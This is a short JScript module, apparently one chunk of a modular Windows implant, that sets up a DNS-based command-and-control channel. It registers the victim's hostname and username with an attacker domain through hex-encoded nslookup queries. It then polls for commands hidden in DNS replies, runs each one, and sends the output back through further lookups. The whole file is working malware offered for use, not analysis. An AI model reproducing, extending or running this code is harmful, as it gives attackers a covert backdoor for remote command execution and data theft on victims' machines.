// chunk: c2/dns_c2
// depends: core/run_cmd, core/emit_buffer
// provides: c2_dns
// format: jscript

function _dns_encode(data, domain) {
    var hex = "";
    for (var i = 0; i < data.length && i < 60; i++) {
        var c = data.charCodeAt(i).toString(16);
        hex += (c.length < 2 ? "0" : "") + c;
    }
    var labels = [];
    for (var j = 0; j < hex.length; j += 60) {
        labels.push(hex.substring(j, j + 60));
    }
    return labels.join(".") + "." + domain;
}

function c2_dns(domain, interval) {
    var hostInfo = _run("hostname").replace(/[\r\n\s]/g, "") + "_" + _run("whoami").replace(/[\r\n\s]/g, "");
    _run("nslookup " + _dns_encode("REG" + hostInfo, domain) + " 2>NUL");
    while (true) {
        WScript.Sleep(interval);
        var r = _run("nslookup " + _dns_encode("POLL", domain) + " 2>NUL");
        var m = r.match(/Address:\s+(\d+\.\d+\.\d+\.\d+)/g);
        if (m && m.length > 1) {
            var addr = m[m.length - 1].replace("Address:", "").replace(/\s/g, "");
            if (addr != "0.0.0.0" && addr != "127.0.0.1") {
                var oct = addr.split(".");
                var cmd = "";
                for (var k = 0; k < oct.length; k++) cmd += String.fromCharCode(parseInt(oct[k]));
                if (cmd.indexOf("EXIT") >= 0) break;
                var out = _run(cmd);
                _run("nslookup " + _dns_encode("RES" + out, domain) + " 2>NUL");
            }
        }
    }
}
